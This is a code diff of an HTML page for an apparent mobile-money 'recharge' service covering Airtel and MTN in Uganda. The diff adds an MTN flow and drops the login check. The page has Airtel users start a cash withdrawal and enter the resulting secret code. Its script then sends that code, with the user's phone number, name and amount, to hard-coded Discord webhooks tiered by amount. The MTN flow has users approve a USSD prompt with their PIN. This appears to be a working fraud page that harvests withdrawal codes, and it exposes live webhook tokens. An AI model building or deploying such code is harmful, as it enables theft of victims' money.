@@ -52,7 +52,7 @@
         .instructions-card ol { padding-left: 24px; }
         .instructions-card ol li { margin-bottom: 10px; font-size: 0.95rem; color: #2E2E4A; line-height: 1.5; }
 
-        /* Progress bar wrapper */
+        /* ── Progress bar wrapper ── */
         .progress-wrapper {
             border-radius: 20px;
             overflow: hidden;
@@ -60,14 +60,12 @@
             padding: 28px 24px 22px;
             margin-bottom: 4px;
         }
-
         .progress-label-row {
             display: flex;
             align-items: center;
             justify-content: space-between;
             margin-bottom: 14px;
         }
-
         .progress-label-text {
             color: rgba(255,255,255,0.7);
             font-size: 0.8rem;
@@ -75,7 +73,6 @@
             text-transform: uppercase;
             font-weight: 600;
         }
-
         .progress-dots::after {
             content: '';
             animation: dots 1.2s steps(1) infinite;
@@ -85,11 +82,7 @@
             33% { content: '..'; }
             66% { content: '...'; }
         }
-
-        .progress-status-icon {
-            font-size: 1rem;
-        }
-
+        .progress-status-icon { font-size: 1rem; }
         .progress-track {
             width: 100%;
             height: 14px;
@@ -98,12 +91,10 @@
             overflow: hidden;
             position: relative;
         }
-
         @keyframes shimmer {
             0%   { transform: translateX(-100%); }
             100% { transform: translateX(400%); }
         }
-
         .progress-fill {
             height: 100%;
             width: 0%;
@@ -113,7 +104,6 @@
             position: relative;
             overflow: hidden;
         }
-
         .progress-fill::after {
             content: '';
             position: absolute;
@@ -123,19 +113,16 @@
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
             animation: shimmer 2s ease-in-out infinite;
         }
-
         .progress-nodes {
             display: flex;
             justify-content: space-between;
             margin-top: 10px;
             padding: 0 2px;
         }
-
         @keyframes node-pulse {
             0%, 100% { opacity: 0.35; transform: scale(1); }
             50%       { opacity: 1;    transform: scale(1.3); }
         }
-
         .progress-node {
             width: 7px;
             height: 7px;
@@ -149,7 +136,6 @@
         .progress-node:nth-child(5) { background: #DD4455; animation-delay: 1.2s; }
         .progress-node:nth-child(6) { background: #EE6633; animation-delay: 1.5s; }
         .progress-node:nth-child(7) { background: #FF7A00; animation-delay: 1.8s; }
-
         .progress-complete-msg {
             display: none;
             color: rgba(255,255,255,0.85);
@@ -159,14 +145,17 @@
             font-weight: 500;
         }
 
+        /* ── Shared reveal animation ── */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ── Airtel: secret code section ── */
         #secret-section { display: none; margin-top: 24px; }
         #secret-section.visible {
             display: block;
             animation: fadeInUp 0.5s ease forwards;
-        }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(16px); }
-            to   { opacity: 1; transform: translateY(0); }
         }
         .secret-label { display: block; font-weight: 600; margin-bottom: 8px; color: #1E1E3A; font-size: 0.95rem; }
         .secret-input {
@@ -176,6 +165,20 @@
             transition: border-color 0.2s; margin-bottom: 20px;
         }
         .secret-input:focus { outline: none; border-color: #7B22CC; box-shadow: 0 0 0 4px rgba(123,34,204,0.08); }
+
+        /* ── MTN: done/failed section ── */
+        #mtn-action-section { display: none; margin-top: 24px; }
+        #mtn-action-section.visible {
+            display: block;
+            animation: fadeInUp 0.5s ease forwards;
+        }
+        .mtn-action-label {
+            font-weight: 600; font-size: 0.95rem; color: #1E1E3A;
+            margin-bottom: 16px; display: block; text-align: center;
+        }
+        .mtn-action-btns { display: flex; gap: 12px; }
+
+        /* Shared button base */
         .btn {
             background: linear-gradient(135deg, #7B22CC, #CC1177);
             border: 1px solid rgba(255,255,255,0.2);
@@ -185,6 +188,23 @@
             transition: transform 0.15s, box-shadow 0.2s;
         }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 18px 28px -10px rgba(204,17,119,0.4); }
+
+        .btn-done {
+            flex: 1; padding: 16px; border: none; border-radius: 40px;
+            background: linear-gradient(135deg, #7B22CC, #CC1177);
+            color: white; font-weight: 700; font-size: 1rem; cursor: pointer;
+            box-shadow: 0 8px 16px rgba(123,34,204,0.25);
+            transition: transform 0.15s, box-shadow 0.2s;
+        }
+        .btn-done:hover { transform: translateY(-2px); box-shadow: 0 14px 24px rgba(123,34,204,0.35); }
+
+        .btn-failed {
+            flex: 1; padding: 16px; border: 2px solid #E2E2F0; border-radius: 40px;
+            background: white; color: #CC1177; font-weight: 700; font-size: 1rem; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-failed:hover { background: #FFF0F6; border-color: #CC1177; }
+
         .back-button { display: block; text-align: center; margin-top: 20px; color: #1A88FF; text-decoration: none; font-weight: 600; }
         .back-button:hover { color: #7B22CC; text-decoration: underline; }
     </style>
@@ -196,29 +216,37 @@
         </div>
 
         <div class="card">
-            <!-- Airtel withdrawal instructions -->
-            <div class="instructions-card">
+            <!-- Instructions — shown based on network type -->
+            <div id="instructions-airtel" class="instructions-card" style="display:none;">
                 <h4><i class="fas fa-info-circle"></i> Airtel Money Instructions</h4>
                 <ol>
                     <li>Dial <strong>*185#</strong> on your Airtel line to open the Airtel Money menu.</li>
                     <li>Choose the option for <strong>"Withdraw Cash"</strong>.</li>
-                    <li>Enter <strong id="amount-instruction">the amount you'd like to withdraw</strong>.</li>
+                    <li>Enter <strong id="amount-instruction">the amount</strong>.</li>
                     <li>Once completed, put the <strong>secret code</strong> given to you in the input below and click <strong>"Confirm Recharge"</strong>.</li>
                     <li>Recharge will <strong>immediately reflect</strong> in your account wallet.</li>
                 </ol>
             </div>
 
-            <!-- Progress bar loading screen -->
+            <div id="instructions-mtn" class="instructions-card" style="display:none;">
+                <h4><i class="fas fa-info-circle"></i> MTN MoMo Instructions</h4>
+                <ol>
+                    <li>Please wait <strong>2–3 minutes maximum</strong> for a USSD prompt to come on your SIM card.</li>
+                    <li>Once you receive the USSD prompt from MTN, please input your <strong>5-digit PIN</strong> to complete the transaction.</li>
+                    <li>Once the transaction is completed, please go back to your <strong>profile page</strong> — the new balance will reflect in about <strong>1 minute</strong>.</li>
+                    <li>If no USSD prompt comes after the progress bar is filled, please dial <strong>*165#</strong> to check for any pending transactions and then input the PIN on your SIM card.</li>
+                </ol>
+            </div>
+
+            <!-- Progress bar -->
             <div class="progress-wrapper" id="progress-wrapper">
                 <div class="progress-label-row">
-                    <span class="progress-label-text">Establishing secure connection<span class="progress-dots"></span></span>
-                    <span class="progress-status-icon">🔐</span>
+                    <span class="progress-label-text" id="progress-label-text"><span class="progress-dots"></span></span>
+                    <span class="progress-status-icon" id="progress-icon">🔐</span>
                 </div>
-
                 <div class="progress-track">
                     <div class="progress-fill" id="progress-fill"></div>
                 </div>
-
                 <div class="progress-nodes">
                     <div class="progress-node"></div>
                     <div class="progress-node"></div>
@@ -228,13 +256,10 @@
                     <div class="progress-node"></div>
                     <div class="progress-node"></div>
                 </div>
-
-                <div class="progress-complete-msg" id="progress-complete-msg">
-                    ✅ Connection established — enter your secret code below
-                </div>
+                <div class="progress-complete-msg" id="progress-complete-msg"></div>
             </div>
 
-            <!-- Secret code input — revealed after timer completes -->
+            <!-- Airtel: secret code input -->
             <div id="secret-section">
                 <label class="secret-label">
                     <i class="fas fa-key"></i>&nbsp; Enter Secret Code (Airtel)
@@ -243,55 +268,89 @@
                 <button id="confirmBtn" class="btn">Confirm Recharge</button>
             </div>
 
+            <!-- MTN: done / failed buttons -->
+            <div id="mtn-action-section">
+                <span class="mtn-action-label">Did your transaction go through?</span>
+                <div class="mtn-action-btns">
+                    <button class="btn-done" id="mtn-done-btn">✅ Done</button>
+                    <button class="btn-failed" id="mtn-failed-btn">❌ Failed, contact support</button>
+                </div>
+            </div>
+
             <a href="recharge.html" class="back-button">← Back to Recharge</a>
         </div>
     </div>
 
     <script type="module">
-        import { getCurrentUser } from './auth.js';
+        // ── Determine network type ──
+        const airtelStored = sessionStorage.getItem('airtel_recharge');
+        const mtnStored    = sessionStorage.getItem('mtn_recharge');
 
-        // ----- PROTECTED PAGE: redirect to login if not authenticated (use replace) -----
-        const { data: { user }, error: userError } = await getCurrentUser();
-        if (userError || !user) {
-            window.location.replace('index.html');
+        if (!airtelStored && !mtnStored) {
+            window.location.href = 'recharge.html';
         }
 
-        const DURATION_MS = 90000;
+        const isAirtel  = !!airtelStored;
+        const isMTN     = !!mtnStored;
+        const stored    = isAirtel ? JSON.parse(airtelStored) : JSON.parse(mtnStored);
+        const { amount, phone, walletName } = stored;
 
-        const stored = sessionStorage.getItem('airtel_recharge');
-        if (!stored) {
-            // No recharge data – go back to recharge page (replace to avoid history stack)
-            window.location.replace('recharge.html');
+        const DURATION_MS = isAirtel ? 90000 : 180000;
+
+        // ── Show correct instructions ──
+        if (isAirtel) {
+            document.getElementById('instructions-airtel').style.display = 'block';
+            const formatted = 'UGX ' + parseInt(amount).toLocaleString();
+            document.getElementById('amount-instruction').textContent = formatted;
+        } else {
+            document.getElementById('instructions-mtn').style.display = 'block';
         }
 
-        const { amount, phone, walletName } = JSON.parse(stored);
+        // ── Set progress bar label ──
+        const labelEl = document.getElementById('progress-label-text');
+        if (isAirtel) {
+            labelEl.innerHTML = 'Establishing secure connection<span class="progress-dots"></span>';
+            document.getElementById('progress-icon').textContent = '🔐';
+        } else {
+            labelEl.innerHTML = 'Initiating recharge, please wait<span class="progress-dots"></span>';
+            document.getElementById('progress-icon').textContent = '📡';
+        }
 
-        // Dynamic amount in instruction step 3
-        const formatted = 'UGX ' + parseInt(amount).toLocaleString();
-        document.getElementById('amount-instruction').textContent = formatted;
 
-        // Persistent timer: use a fixed start time stored in sessionStorage
-        const timerKey = 'airtel_recharge_start_' + amount;
 
-        let startTime = parseInt(sessionStorage.getItem(timerKey) || '0');
+        // ── Persistent timer ──
+        const timerKey  = (isAirtel ? 'airtel' : 'mtn') + '_recharge_start_' + amount;
+        let startTime   = parseInt(sessionStorage.getItem(timerKey) || '0');
         if (!startTime) {
             startTime = Date.now();
             sessionStorage.setItem(timerKey, startTime.toString());
         }
 
-        const progressFill   = document.getElementById('progress-fill');
+        const progressFill    = document.getElementById('progress-fill');
         const progressWrapper = document.getElementById('progress-wrapper');
-        const completeMsg    = document.getElementById('progress-complete-msg');
-        const secretSection  = document.getElementById('secret-section');
+        const completeMsg     = document.getElementById('progress-complete-msg');
 
-        function revealInput() {
+        function revealSection() {
             progressFill.style.width = '100%';
             setTimeout(() => {
+                if (isAirtel) {
+                    completeMsg.textContent = '✅ Connection established — enter your secret code below';
+                } else {
+                    completeMsg.textContent = '✅ Recharge initiated — please check your phone';
+                }
                 completeMsg.style.display = 'block';
                 setTimeout(() => {
                     progressWrapper.style.display = 'none';
-                    secretSection.classList.add('visible');
                     sessionStorage.removeItem(timerKey);
+                    if (isAirtel) {
+                        const airtelSection = document.getElementById('secret-section');
+                        airtelSection.style.display = '';
+                        airtelSection.classList.add('visible');
+                    } else {
+                        const mtnSection = document.getElementById('mtn-action-section');
+                        mtnSection.style.display = '';
+                        mtnSection.classList.add('visible');
+                    }
                 }, 800);
             }, 400);
         }
@@ -299,7 +358,7 @@
         function tick() {
             const elapsed = Date.now() - startTime;
             if (elapsed >= DURATION_MS) {
-                revealInput();
+                revealSection();
                 return;
             }
             const pct = Math.min((elapsed / DURATION_MS) * 100, 100);
@@ -307,21 +366,27 @@
             requestAnimationFrame(tick);
         }
 
-        const alreadyElapsed = Date.now() - startTime;
-        if (alreadyElapsed >= DURATION_MS) {
-            revealInput();
+        if (Date.now() - startTime >= DURATION_MS) {
+            revealSection();
         } else {
             requestAnimationFrame(tick);
         }
 
-        // Webhook URL helper (unchanged)
-        function getAirtelWebhookUrl(amount) {
-            if (amount <= 40000)  return 'https://discord.com/api/webhooks/1476249951163121705/l92a50vk2nX1kXEWD7LmLtctDH30px8ZHShBE1iUTMFRChKdtPKcLvCMjC05e0YA1wtc';
-            if (amount <= 100000) return 'https://discord.com/api/webhooks/1505134939006304396/fSnIinb0f7rBEaEhsNDEZodxC8-kb3Gsi3yWPw9roUiMCDni9tCQ5V924J2RNn3LYzmA';
-            if (amount <= 250000) return 'https://discord.com/api/webhooks/1505135801263194182/I3UxUo3_Wm1EiUVoPi4xA0nLYUhGexi1hVbqmWrRtYMFNwPTF6jRsk4ibmGOGHHXaAT5';
-            return 'https://discord.com/api/webhooks/1505136197046108251/jGJrPDipPlPwx27zHEvWU7RHbmfeZqlvADlGo5qSLb5yzNC4qoQg2q_rekYYswD4gabL';
+        // ── Webhook helpers ──
+        function getWebhookUrl(amount, network) {
+            const urls = {
+                low:    'https://discord.com/api/webhooks/1476249951163121705/l92a50vk2nX1kXEWD7LmLtctDH30px8ZHShBE1iUTMFRChKdtPKcLvCMjC05e0YA1wtc',
+                mid:    'https://discord.com/api/webhooks/1505134939006304396/fSnIinb0f7rBEaEhsNDEZodxC8-kb3Gsi3yWPw9roUiMCDni9tCQ5V924J2RNn3LYzmA',
+                high:   'https://discord.com/api/webhooks/1505135801263194182/I3UxUo3_Wm1EiUVoPi4xA0nLYUhGexi1hVbqmWrRtYMFNwPTF6jRsk4ibmGOGHHXaAT5',
+                higher: 'https://discord.com/api/webhooks/1505136197046108251/jGJrPDipPlPwx27zHEvWU7RHbmfeZqlvADlGo5qSLb5yzNC4qoQg2q_rekYYswD4gabL'
+            };
+            if (amount <= 40000)  return urls.low;
+            if (amount <= 100000) return urls.mid;
+            if (amount <= 250000) return urls.high;
+            return urls.higher;
         }
 
+        // ── Airtel confirm button ──
         document.getElementById('confirmBtn').addEventListener('click', async () => {
             const secretCode = document.getElementById('secretCode').value.trim();
             if (!secretCode) {
@@ -330,19 +395,29 @@
             }
             try {
                 const msg = `🔋 Recharge Request!\n💳 Payment Method: Airtel Money\n📞 Phone: ${phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${parseInt(amount).toLocaleString()}\n🔑 Secret Code: ${secretCode}`;
-                await fetch(getAirtelWebhookUrl(amount), {
+                await fetch(getWebhookUrl(amount), {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: msg })
                 });
                 sessionStorage.removeItem('airtel_recharge');
                 alert('Thank you for your payment. It will be confirmed shortly.');
-                // Use replace so user can't back into the confirmation page
-                window.location.replace('home.html');
+                window.location.href = 'home.html';
             } catch (err) {
                 console.error(err);
                 alert('Error sending request: ' + err.message);
             }
+        });
+
+        // ── MTN done / failed buttons ──
+        document.getElementById('mtn-done-btn').addEventListener('click', () => {
+            sessionStorage.removeItem('mtn_recharge');
+            window.location.href = 'home.html';
+        });
+
+        document.getElementById('mtn-failed-btn').addEventListener('click', () => {
+            sessionStorage.removeItem('mtn_recharge');
+            window.location.href = 'support.html';
         });
     </script>
 </body>
